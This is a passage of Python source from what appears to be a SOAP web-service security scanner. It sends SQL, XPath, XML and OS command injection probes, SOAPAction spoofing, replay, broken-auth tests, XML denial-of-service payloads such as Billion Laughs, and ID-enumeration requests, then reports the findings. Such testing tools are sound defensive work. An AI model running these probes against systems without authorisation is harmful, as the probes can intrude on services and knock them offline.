                    extra_desc = f"Payload: {payload!r}. Technique: error-based.",
                )]

        # ── Technique 2 — Boolean-blind ───────────────────────────────────────
        for t_payload, f_payload in zip(_SQLI_BOOL_TRUE, _SQLI_BOOL_FALSE):
            env_t = _envelope(f"<web:getUser><userId>1{t_payload}</userId></web:getUser>")
            env_f = _envelope(f"<web:getUser><userId>1{f_payload}</userId></web:getUser>")
            r_t   = self._soap_post(path, env_t)
            r_f   = self._soap_post(path, env_f)
            if r_t is None or r_f is None:
                continue

            body_t = (r_t.text or "").strip()
            body_f = (r_f.text or "").strip()
            len_t, len_f = len(body_t), len(body_f)

            # Significant length difference between true and false condition
            if body_t != body_f and abs(len_t - len_f) > 20:
                logger.info(
                    f"    [VULN] SOAP-03 SQLi boolean-blind → {endpoint} | "
                    f"true_len={len_t} false_len={len_f}"
                )
                return [_vuln(
                    name      = "sqli",
                    endpoint  = endpoint,
                    method    = "POST",
                    payload   = f"TRUE: {t_payload!r} / FALSE: {f_payload!r}",
                    parameter = "userId",
                    evidence  = (
                        f"Boolean-blind SQLi confirmed. "
                        f"TRUE condition: {len_t} bytes; FALSE condition: {len_f} bytes. "
                        f"Delta: {abs(len_t - len_f)} bytes — confirms parameter reaches SQL query."
                    ),
                    extra_desc = "Technique: boolean-blind. No error message needed for exploitation.",
                )]

        # ── Technique 3 — Time-based blind ───────────────────────────────────
        for payload in _SQLI_TIME_PAYLOADS:
            env = _envelope(
                f"<web:getUser><userId>1{payload}</userId></web:getUser>"
            )
            t0 = time.monotonic()
            r  = self._soap_post(path, env)
            elapsed = time.monotonic() - t0

            if elapsed >= _SQLI_TIME_THRESHOLD:
                logger.info(
                    f"    [VULN] SOAP-03 SQLi time-based → {endpoint} | "
                    f"delay={elapsed:.2f}s payload={payload!r}"
                )
                return [_vuln(
                    name      = "sqli",
                    endpoint  = endpoint,
                    method    = "POST",
                    payload   = payload,
                    parameter = "userId",
                    evidence  = (
                        f"Time-based blind SQLi confirmed. "
                        f"Response delayed {elapsed:.2f}s (threshold: {_SQLI_TIME_THRESHOLD}s). "
                        f"Payload: {payload!r}"
                    ),
                    extra_desc = (
                        "Technique: time-based blind. "
                        "Exploitable even with no visible output — full DB extraction possible."
                    ),
                )]

        return []

    # =========================================================================
    #  SOAP-04 — XML/SOAP Parameter Injection
    # =========================================================================

    def _test_xml_injection(self, endpoint: str) -> list[ScanResult]:
        """
        Baseline-first XML injection detection (SecureLayer7 methodology):

        1. Establish a baseline response for a normal createUser request.
        2. Inject XML-special characters into the string parameter.
        3. Compare response: status change, body structure change, or error-
           message absence indicate successful injection.

        Avoids the keyword-presence false-positive trap of the previous version.
        """
        path = self._rel(endpoint)

        # Baseline — normal createUser
        baseline_env = _envelope(
            "<web:createUser>"
            "<username>testuser</username>"
            "<email>test@example.com</email>"
            "<role>user</role>"
            "</web:createUser>"
        )
        r_base = self._soap_post(path, baseline_env)
        if r_base is None:
            return []

        base_status = r_base.status_code
        base_body   = (r_base.text or "").strip()
        base_len    = len(base_body)

        for label, inj_value in _XML_INJECTION_VALUES:
            injected_env = _envelope(
                "<web:createUser>"
                f"<username>{inj_value}</username>"
                "<email>test@example.com</email>"
                "<role>user</role>"
                "</web:createUser>"
            )
            r = self._soap_post(path, injected_env)
            if r is None:
                continue

            inj_body   = (r.text or "").strip()
            inj_status = r.status_code

            status_changed  = inj_status != base_status
            len_delta       = abs(len(inj_body) - base_len)
            body_changed    = inj_body != base_body and len_delta > 30
            no_parse_error  = not any(
                s in inj_body.lower()
                for s in ["invalid xml", "xml parse", "not well-formed",
                           "malformed", "parsing error"]
            )

            if (status_changed or body_changed) and no_parse_error:
                logger.info(
                    f"    [VULN] SOAP-04 XML Injection ({label}) → {endpoint}"
                )
                change = (
                    f"status {base_status}→{inj_status}"
                    if status_changed
                    else f"body length delta {len_delta} bytes"
                )
                return [_vuln(
                    name      = "injection",
                    endpoint  = endpoint,
                    method    = "POST",
                    payload   = inj_value,
                    parameter = "username (string parameter)",
                    evidence  = (
                        f"XML injection confirmed via {label}. "
                        f"Response changed without XML parse error: {change}. "
                        f"Injected value processed by server as XML structure, not as data."
                    ),
                    extra_desc = (
                        f"Technique: {label}. "
                        "Server processes injected XML structure — input not sanitized."
                    ),
                )]

        return []

    # =========================================================================
    #  SOAP-05 — Broken WS-Security Authentication
    # =========================================================================

    def _test_broken_auth(self, endpoint: str) -> list[ScanResult]:
        """
        Three sub-tests:
          A. No auth header at all → HTTP 200 without auth error = broken auth.
          B. Invalid Bearer token → accepted = token not validated.
          C. Malformed WS-Security UsernameToken → accepted = WS-Security not enforced.
        """
        path         = self._rel(endpoint)
        saved_auth   = self.http._session.headers.get("Authorization")
        base_env     = _envelope("<web:getUser><userId>1</userId></web:getUser>")
        ws_env       = _envelope(
            "<web:getUser><userId>1</userId></web:getUser>",
        )
        wsse_env = (
            '<?xml version="1.0" encoding="utf-8"?>'
            '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" '
            'xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">'
            "<soapenv:Header>"
            "<wsse:Security>"
            "<wsse:UsernameToken>"
            "<wsse:Username>invalid_user_xyz</wsse:Username>"
            "<wsse:Password>WRONG_PASSWORD_XYZ_123!</wsse:Password>"
            "</wsse:UsernameToken>"
            "</wsse:Security>"
            "</soapenv:Header>"
            "<soapenv:Body><web:getUser><userId>1</userId></web:getUser></soapenv:Body>"
            "</soapenv:Envelope>"
        )

        def _auth_refused(r) -> bool:
            if r is None:
                return True
            if r.status_code in (401, 403):
                return True
            bl = (r.text or "").lower()
            return any(s in bl for s in _AUTH_ERROR_SIGNALS)

        results = []

        # Sub-test A — no auth header
        try:
            self.http.clear_token()
            r = self._soap_post(path, base_env)
            if r is not None and r.status_code == 200 and not _auth_refused(r):
                preview = (r.text or "")[:80].replace("\n", " ")
                logger.info(f"    [VULN] SOAP-05 Broken Auth (no header) → {endpoint}")
                results.append(_vuln(
                    name      = "auth",
                    endpoint  = endpoint,
                    method    = "POST",
                    payload   = "SOAP envelope without any auth header",
                    evidence  = (
                        f"HTTP 200 with no authentication header. "
                        f'No auth error signals. Preview: "{preview}"'
                    ),
                    extra_desc = "Sub-test A: no Authorization or WS-Security header accepted.",
                ))
        finally:
            if saved_auth:
                self.http._session.headers["Authorization"] = saved_auth

        # Sub-test B — invalid Bearer token
        try:
            self.http.set_token("INVALID_TOKEN_APISEC_XYZ_000")
            r = self._soap_post(path, base_env)
            if r is not None and r.status_code == 200 and not _auth_refused(r):
                logger.info(f"    [VULN] SOAP-05 Broken Auth (invalid token) → {endpoint}")
                results.append(_vuln(
                    name      = "auth",
                    endpoint  = endpoint,
                    method    = "POST",
                    payload   = "Authorization: Bearer INVALID_TOKEN_APISEC_XYZ_000",
                    evidence  = (
                        "HTTP 200 with deliberately invalid Bearer token. "
                        "Token is not validated server-side."
                    ),
                    extra_desc = "Sub-test B: invalid Bearer token accepted.",
                ))
        finally:
            self.http.clear_token()
            if saved_auth:
                self.http._session.headers["Authorization"] = saved_auth

        # Sub-test C — malformed WS-Security UsernameToken
        try:
            self.http.clear_token()
            r = self._soap_post(path, wsse_env)
            if r is not None and r.status_code == 200 and not _auth_refused(r):
                logger.info(f"    [VULN] SOAP-05 Broken Auth (malformed WSSE) → {endpoint}")
                results.append(_vuln(
                    name      = "auth",
                    endpoint  = endpoint,
                    method    = "POST",
                    payload   = "WS-Security UsernameToken with wrong credentials",
                    evidence  = (
                        "HTTP 200 with wrong WS-Security UsernameToken credentials. "
                        "WS-Security is not enforced or not validated."
                    ),
                    extra_desc = "Sub-test C: invalid WS-Security UsernameToken accepted.",
                ))
        finally:
            if saved_auth:
                self.http._session.headers["Authorization"] = saved_auth

        return results

    # =========================================================================
    #  SOAP-06 — Replay Attack
    # =========================================================================

    def _test_replay(self, endpoint: str) -> list[ScanResult]:
        """
        Two replay sub-tests:

        A. Identical request replay — send same envelope twice; both HTTP 200
           without any nonce/timestamp rejection = replay not prevented.

        B. Expired-Timestamp replay — send a WS-Security Timestamp with a
           Created/Expires in the past; if server accepts it, replay is trivial.

        Avoids the false-negative trap of checking for "created" in responses
        (that word appears in normal JSON/XML everywhere).
        """
        path    = self._rel(endpoint)
        env     = _envelope("<web:getUser><userId>1</userId></web:getUser>")
        results = []

        # Sub-test A — identical request replay
        r1 = self._soap_post(path, env)
        r2 = self._soap_post(path, env)

        if (r1 is not None and r2 is not None
                and r1.status_code == 200 and r2.status_code == 200):
            # Confirm neither response indicates replay detection
            rejection_signals = [
                "replay", "message expired", "nonce already used",
                "duplicate message", "message id already processed",
                "wsse:MessageExpired",
            ]
            combined = ((r1.text or "") + (r2.text or "")).lower()
            no_replay_protection = not any(s in combined for s in rejection_signals)
            if no_replay_protection:
                logger.info(f"    [VULN] SOAP-06 Replay (identical) → {endpoint}")
                results.append(_vuln(
                    name    = "replay",
                    endpoint= endpoint,
                    method  = "POST",
                    payload = "Two identical SOAP envelopes sent sequentially",
                    evidence= (
                        "Both requests returned HTTP 200. "
                        "No replay-rejection signals in either response. "
                        "No nonce cache or timestamp freshness check detected."
                    ),
                    extra_desc = "Sub-test A: identical replay not rejected.",
                ))

        # Sub-test B — expired WS-Security Timestamp
        expired_env = (
            '<?xml version="1.0" encoding="utf-8"?>'
            '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" '
            'xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">'
            "<soapenv:Header>"
            "<wsu:Timestamp>"
            "<wsu:Created>2000-01-01T00:00:00Z</wsu:Created>"
            "<wsu:Expires>2000-01-01T00:05:00Z</wsu:Expires>"
            "</wsu:Timestamp>"
            "</soapenv:Header>"
            "<soapenv:Body>"
            "<web:getUser xmlns:web='http://example.com/webservice'>"
            "<userId>1</userId>"
            "</web:getUser>"
            "</soapenv:Body>"
            "</soapenv:Envelope>"
        )
        r_exp = self._soap_post(path, expired_env)
        if r_exp is not None and r_exp.status_code == 200:
            body_low = (r_exp.text or "").lower()
            expiry_rejected = any(
                s in body_low
                for s in ["expired", "message expired", "wsse:messageexpired",
                           "timestamp", "invalid timestamp"]
            )
            if not expiry_rejected:
                logger.info(f"    [VULN] SOAP-06 Replay (expired timestamp) → {endpoint}")
                results.append(_vuln(
                    name    = "replay",
                    endpoint= endpoint,
                    method  = "POST",
                    payload = "WS-Security Timestamp: Created=2000-01-01 / Expires=2000-01-01",
                    evidence= (
                        "HTTP 200 with WS-Security Timestamp expired since year 2000. "
                        "Server does not validate Timestamp freshness — "
                        "any captured message can be replayed indefinitely."
                    ),
                    extra_desc = "Sub-test B: expired wsu:Timestamp accepted without rejection.",
                ))

        return results

    # =========================================================================
    #  SOAP-07 — SOAPAction Header Spoofing
    # =========================================================================

    def _test_action_spoofing(self, endpoint: str) -> list[ScanResult]:
        """
        Two-phase spoofing test:

        Phase 1 — Header-only spoof: keep body unchanged, change SOAPAction.
        Phase 2 — Header + body spoof: change both header and body to target op.

        Source priority for action names:
          1. High-risk operations extracted from WSDL (if SOAP-01 ran first)
          2. Full WSDL operation list
          3. Hardcoded list of common privileged names
        """
        path = self._rel(endpoint)

        if self._wsdl.available and self._wsdl.operations:
            # Prefer high-risk ops first, then all ops
            actions = (self._wsdl.high_risk_ops or []) + [
                op for op in self._wsdl.operations
                if op not in (self._wsdl.high_risk_ops or [])
            ]
            actions_src = f"WSDL ({len(actions)} ops)"
        else:
            actions     = _DEFAULT_SOAP_ACTIONS
            actions_src = "hardcoded fallback"
            if self._wsdl.status == WsdlStatus.BLOCKED:
                logger.info(
                    f"    [INFO] SOAP-07 — WSDL unavailable; "
                    f"testing {len(actions)} hardcoded SOAPAction names."
                )

        base_env   = _envelope("<web:getUser><userId>1</userId></web:getUser>")
        r_ref      = self._soap_post(path, base_env, soapaction="")
        if r_ref is None:
            return []

        ref_status = r_ref.status_code
        ref_body   = (r_ref.text or "").strip()

        for action in actions:
            # Phase 1 — header-only spoof
            r = self._soap_post(path, base_env, soapaction=action)
            if r is None:
                continue

            status_diff = r.status_code != ref_status
            body_diff   = (r.text or "").strip() != ref_body

            if (status_diff or body_diff) and r.status_code != 404:
                change = (
                    f"status {ref_status}→{r.status_code}"
                    if status_diff else "response body changed"
                )
                logger.info(
                    f"    [VULN] SOAP-07 SOAPAction Spoof (header-only) → {endpoint} | "
                    f"action={action!r} | {change} | src={actions_src}"
                )
                return [_vuln(
                    name      = "action_spoofing",
                    endpoint  = endpoint,
                    method    = "POST",
                    payload   = f'SOAPAction: "{action}"',
                    parameter = "SOAPAction (HTTP header)",
                    evidence  = (
                        f'Spoofed SOAPAction "{action}" changed server behavior ({change}). '
                        f"Server routes on header, not body element — "
                        f"operation-level access controls bypassed. Source: {actions_src}."
                    ),
                    extra_desc = f"Phase 1: header-only spoof. Action source: {actions_src}.",
                )]

            # Phase 2 — header + body spoof (body matches spoofed action)
            spoofed_body = _envelope(
                f"<web:{action}><userId>1</userId><id>1</id></web:{action}>"
            )
            r2 = self._soap_post(path, spoofed_body, soapaction=action)
            if r2 is None:
                continue

            status_diff2 = r2.status_code != ref_status
            body_diff2   = (r2.text or "").strip() != ref_body

            if (status_diff2 or body_diff2) and r2.status_code not in (404, 500):
                change2 = (
                    f"status {ref_status}→{r2.status_code}"
                    if status_diff2 else "response body changed"
                )
                logger.info(
                    f"    [VULN] SOAP-07 SOAPAction Spoof (header+body) → {endpoint} | "
                    f"action={action!r} | {change2}"
                )
                return [_vuln(
                    name      = "action_spoofing",
                    endpoint  = endpoint,
                    method    = "POST",
                    payload   = f'SOAPAction: "{action}" + body: <{action}>',
                    parameter = "SOAPAction + Body element",
                    evidence  = (
                        f'Full spoof of SOAPAction "{action}" (header + body) '
                        f"changed server behavior ({change2}). "
                        "Privileged operation invoked via spoofing."
                    ),
                    extra_desc = "Phase 2: header + body spoof — full operation substitution.",
                )]

        return []

    # =========================================================================
    #  SOAP-08 — OS Command Injection
    # =========================================================================

    def _test_cmd_injection(self, endpoint: str) -> list[ScanResult]:
        """
        Tests 15 command injection payloads using common OS separators
        (; && || | & backtick $()).

        The valid-looking base value (127.0.0.1) mimics DNS/ping parameters
        that are frequently passed to shell commands. Detects both Linux and
        Windows command output in the response body.
        """
        path = self._rel(endpoint)

        for label, cmd_suffix in _CMD_PAYLOADS:
            injected = f"{_CMD_TEST_INPUT}{cmd_suffix}"
            env = _envelope(
                "<web:lookupDNS>"
                f"<ipAddress>{injected}</ipAddress>"
                f"<host>{injected}</host>"
                f"<target>{injected}</target>"
                "</web:lookupDNS>"
            )
            r = self._soap_post(path, env)
            if r is None:
                continue

            body = r.text or ""
            hit = next((s for s in _CMD_SUCCESS_SIGNALS if s.lower() in body.lower()), None)
            if hit:
                excerpt = self._ctx(body, hit, 150)
                logger.info(
                    f"    [VULN] SOAP-08 CMDi ({label}) → {endpoint} | signal: {hit!r}"
                )
                return [_vuln(
                    name      = "cmd_injection",
                    endpoint  = endpoint,
                    method    = "POST",
                    payload   = injected,
                    parameter = "ipAddress / host / target",
                    evidence  = (
                        f"OS command injection confirmed via {label}. "
                        f'Command output signal "{hit}" in response. '
                        f'Excerpt: "{excerpt}"'
                    ),
                    extra_desc = (
                        f"Separator: {label}. "
                        "Server passes parameter to OS shell without sanitization."
                    ),
                )]

        return []

    # =========================================================================
    #  SOAP-09 — XML Denial of Service
    # =========================================================================

    def _test_xml_dos(self, endpoint: str) -> list[ScanResult]:
        """
        Four XML DoS techniques:
          1. Billion Laughs — exponential entity expansion (memory exhaustion)
          2. Quadratic Blowup — linear but large entity expansion (CPU)
          3. Deep Nesting — 300-level element nesting (stack overflow)
          4. Oversized Payload — 512KB SOAP body (memory/CPU)

        Detection: abnormal response time (> threshold), HTTP 500/503, or
        connection closed/reset (server crashed or OOM-killed).
        """
        path    = self._rel(endpoint)
        results = []

        dos_cases = [
            ("Billion Laughs",       _XML_DOS_BILLION_LAUGHS,  _DOS_TIME_THRESHOLD),
            ("Quadratic Blowup",     _XML_DOS_QUAD_BLOWUP,     _DOS_TIME_THRESHOLD),
            ("Deep Nesting (300)",   _xml_dos_deep_nesting(),  _DOS_TIME_THRESHOLD),
            ("Oversized (512KB)",    _xml_dos_oversized(512),  _DOS_TIME_THRESHOLD),
        ]

        for label, payload, threshold in dos_cases:
            t0      = time.monotonic()
            r       = self._soap_post(path, payload)
            elapsed = time.monotonic() - t0

            # Crash (None) or 5xx = server degraded by payload
            server_error = r is None or r.status_code in (500, 503, 504)
            # Abnormal delay suggests resource exhaustion
            slow_response = elapsed >= threshold

            if server_error or slow_response:
                condition = (
                    f"server returned {r.status_code}" if (r and r.status_code >= 500)
                    else f"no response (connection closed)" if r is None
                    else f"response delayed {elapsed:.2f}s"
                )
                logger.info(f"    [VULN] SOAP-09 XML DoS ({label}) → {endpoint} | {condition}")
                results.append(_vuln(
                    name    = "xml_dos",
                    endpoint= endpoint,
                    method  = "POST",
                    payload = label,
                    evidence= (
                        f"XML DoS confirmed via {label}. "
                        f"Server condition: {condition}. "
                        "XML parser has no limits on entity expansion, "
                        "message size, or nesting depth."
                    ),
                    extra_desc = f"Technique: {label}. Elapsed: {elapsed:.2f}s.",
                ))

        return results

    # =========================================================================
    #  SOAP-10 — XPath Injection
    # =========================================================================

    def _test_xpath_injection(self, endpoint: str) -> list[ScanResult]:
        """
        Injects XPath expressions into common string parameters.
        Establishes a baseline first (same approach as SQLi):
          - Error signals in response → error-based XPath injection.
          - Response body/status differs from baseline → blind XPath injection.
        """
        path = self._rel(endpoint)

        # Baseline
        base_env    = _envelope("<web:getUser><username>admin</username></web:getUser>")
        r_base      = self._soap_post(path, base_env)
        base_body   = (r_base.text or "").strip() if r_base else ""
        base_status = r_base.status_code if r_base else 200

        for payload in _XPATH_PAYLOADS:
            env = _envelope(
                "<web:getUser>"
                f"<username>{payload}</username>"
                f"<userId>{payload}</userId>"
                "</web:getUser>"
            )
            r = self._soap_post(path, env)
            if r is None:
                continue

            body     = r.text or ""
            body_low = body.lower()

            # Error-based
            hit = next((s for s in _XPATH_ERROR_SIGNALS if s in body_low), None)
            if hit:
                excerpt = self._ctx(body, hit, 120)
                logger.info(
                    f"    [VULN] SOAP-10 XPath error-based → {endpoint} | signal: {hit!r}"
                )
                return [_vuln(
                    name      = "xpath_injection",
                    endpoint  = endpoint,
                    method    = "POST",
                    payload   = payload,
                    parameter = "username / userId",
                    evidence  = (
                        f"XPath injection confirmed (error-based). "
                        f'XPath error signal "{hit}" in response. '
                        f'Excerpt: "{excerpt}"'
                    ),
                    extra_desc = f"Payload: {payload!r}. Technique: error-based XPath injection.",
                )]

            # Blind — response changed compared to baseline
            body_strip = body.strip()
            if (body_strip != base_body and abs(len(body_strip) - len(base_body)) > 20
                    and r.status_code != base_status):
                logger.info(f"    [VULN] SOAP-10 XPath blind → {endpoint}")
                return [_vuln(
                    name      = "xpath_injection",
                    endpoint  = endpoint,
                    method    = "POST",
                    payload   = payload,
                    parameter = "username / userId",
                    evidence  = (
                        f"Blind XPath injection suspected. "
                        f"Response changed significantly vs baseline: "
                        f"status {base_status}→{r.status_code}, "
                        f"body delta {abs(len(body_strip)-len(base_body))} bytes."
                    ),
                    extra_desc = f"Payload: {payload!r}. Technique: blind XPath injection.",
                )]

        return []

    # =========================================================================
    #  SOAP-11 — SOAP Fault Information Disclosure
    # =========================================================================

    def _test_fault_disclosure(self, endpoint: str) -> list[ScanResult]:
        """
        Send 5 deliberately malformed SOAP requests designed to trigger Fault
        responses. Analyzes each Fault body for:
          - Java/C# stack traces
          - Framework/server version strings
          - Database query fragments
          - Internal file path disclosure
          - Internal class/package names
        """
        path = self._rel(endpoint)

        for probe_label, probe_env in _FAULT_PROBES:
            r = self._soap_post(path, probe_env)
            if r is None:
                continue

            body     = r.text or ""
            body_low = body.lower()

            # Only analyze responses that look like Fault messages
            is_fault = (
                r.status_code in (400, 500)
                or "fault" in body_low
                or "faultcode" in body_low
                or "faultstring" in body_low
                or "soap:fault" in body_low
            )
            if not is_fault:
                continue

            hit = next((s for s in _FAULT_TECH_SIGNALS if s.lower() in body_low), None)
            if hit:
                excerpt = self._ctx(body, hit, 200)
                logger.info(
                    f"    [VULN] SOAP-11 Fault Disclosure ({probe_label}) → "
                    f"{endpoint} | signal: {hit!r}"
                )
                return [_vuln(
                    name    = "fault_disclosure",
                    endpoint= endpoint,
                    method  = "POST",
                    payload = probe_label,
                    evidence= (
                        f"Sensitive information in SOAP Fault via {probe_label}. "
                        f'Technical signal "{hit}" exposed. '
                        f'Excerpt: "{excerpt}"'
                    ),
                    extra_desc = (
                        f"Probe: {probe_label}. "
                        "Stack traces, framework versions, or internal paths in Fault "
                        "accelerate targeted exploitation."
                    ),
                )]

        return []

    # =========================================================================
    #  SOAP-12 — Broken Object Level Authorization (BOLA/IDOR)
    # =========================================================================

    def _test_bola(self, endpoint: str) -> list[ScanResult]:
        """
        Tests sequential ID enumeration on common SOAP operations.

        Method:
          1. Send request with userId=1 (self-reference baseline).
          2. Send request with userId=2 (different object).
          3. If both return HTTP 200 with different non-empty bodies,
             the service does not enforce ownership — BOLA confirmed.

        Uses WSDL operations if available, otherwise generic operation names.
        """
        path = self._rel(endpoint)

        operations = (
            [op for op in self._wsdl.operations if any(
                kw in op.lower() for kw in ["get", "fetch", "view", "retrieve", "read"]
            )][:5]
            if self._wsdl.available
            else _BOLA_GENERIC_OPS[:5]
        )

        for op in operations:
            for param in _BOLA_PARAM_NAMES[:5]:
                env1 = _envelope(f"<web:{op}><{param}>1</{param}></web:{op}>")
                env2 = _envelope(f"<web:{op}><{param}>2</{param}></web:{op}>")

                r1 = self._soap_post(path, env1)
                r2 = self._soap_post(path, env2)

                if r1 is None or r2 is None:
                    continue
                if r1.status_code != 200 or r2.status_code != 200:
                    continue

                body1 = (r1.text or "").strip()
                body2 = (r2.text or "").strip()

                # Both return data, bodies are different and non-empty
                if body1 and body2 and body1 != body2 and len(body1) > 50:
                    logger.info(
                        f"    [VULN] SOAP-12 BOLA → {endpoint} | "
                        f"op={op} param={param}"
                    )
                    return [_vuln(
                        name      = "bola",
                        endpoint  = endpoint,
                        method    = "POST",
                        payload   = f"<{param}>1</{param}> vs <{param}>2</{param}>",
                        parameter = f"{param} in {op}",
                        evidence  = (
                            f"BOLA confirmed on operation {op!r} via parameter {param!r}. "
                            f"ID=1 returned {len(body1)} bytes; "
                            f"ID=2 returned {len(body2)} bytes — both HTTP 200, different data. "
                            "No ownership check detected."
                        ),
                        extra_desc = (
                            f"Operation: {op}. Parameter: {param}. "
                            "Any authenticated caller can access arbitrary records "
                            "by substituting the object identifier."
                        ),
                    )]

        return []

    # =========================================================================
    #  Private helpers
    # =========================================================================

    def _rel(self, endpoint: str) -> str:
        path = endpoint.replace(self.base_url, "") or "/"
        # Strip trailing slash — breaks some SOAP servers
        path = path.rstrip("/") or "/"
        return path if path.startswith("/") or path.startswith("?") else "/" + path

    def _soap_post(
        self,
        path:       str,
        body:       str,
        soapaction: str = "",
    ):
        """Send a SOAP POST with proper Content-Type and SOAPAction."""
        return self.http.post(
            path,
            data    = body,
            headers = {
                "Content-Type": "text/xml; charset=utf-8",
                "SOAPAction":   f'"{soapaction}"',
            },
        )

    @staticmethod
    def _is_wsdl(body: str) -> bool:
        """Return True if the body looks like a WSDL document."""
        low = body.lower()
        return (
            "definitions" in low or "wsdl" in low
            or "porttype" in low or "binding" in low
        )

    @staticmethod
    def _ctx(text: str, signal: str, window: int = 150) -> str:
        """Return a context window around the first occurrence of signal."""
        idx = text.lower().find(signal.lower())
        if idx == -1:
            return text[:window].strip()
        return text[max(0, idx - 20): idx + window].strip()

    def _resolve_endpoints(self, endpoints: list[str]) -> list[str]:
        """
        Filter provided endpoints for SOAP keywords.
        Falls back to probing canonical SOAP paths off the base URL.
        """
        keywords = ("soap", "wsdl", "service", "services", "ws",
                    "webservice", ".asmx", ".svc", "endpoint")
        matched  = [ep for ep in endpoints
                    if any(kw in ep.lower() for kw in keywords)]
        if not matched:
            logger.debug("[SOAP] No SOAP keywords in endpoints — probing fallback paths")
            return [f"{self.base_url}{p}" for p in SOAP_FALLBACK_PATHS]
        return matched


# ─────────────────────────────────────────────────────────────────────────────
#  Module-level accessor for --list-tests
# ─────────────────────────────────────────────────────────────────────────────

def get_soap_tests() -> list[dict]:
    """Return all SOAP tests with implementation status for --list-tests."""
    implemented = set(SOAPScanner._TEST_REGISTRY.keys())
    return [
        {**entry, "name": key, "implemented": key in implemented}
        for key, entry in _soapdb.entries
    ]